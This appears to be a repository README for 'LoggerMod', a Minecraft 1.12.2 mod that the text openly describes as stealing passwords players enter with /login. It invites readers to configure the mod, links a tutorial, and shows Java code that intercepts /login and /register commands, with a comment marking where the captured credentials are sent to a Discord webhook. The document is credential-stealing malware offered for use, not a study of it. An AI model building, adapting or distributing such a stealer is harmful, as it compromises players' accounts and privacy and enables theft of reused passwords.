# 🔌 LoggerMod
This mod on 1.12.2 steals the entered passwords (Entered via /login)


# ⚡ How to configure?
You can easily change the config for yourself  
Tutorial: [Click](https://www.youtube.com/watch?v=RxuuHBnjgj0) (in Russian)

# ❓ How it Works?
```java
    @SubscribeEvent
    public void ChatEvent(ClientChatEvent e) {
        String msg = e.getMessage();
        String[] sentences = e.getMessage().split(" ");

        if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
            // Sending to your discord server use Webhook
        }
    }
``` 

# 📱 Screenshots
![Screenshot_20220303_200054](https://user-images.githubusercontent.com/100863585/156613993-d4fd0a97-e967-4539-be72-2893f90d70ba.png)
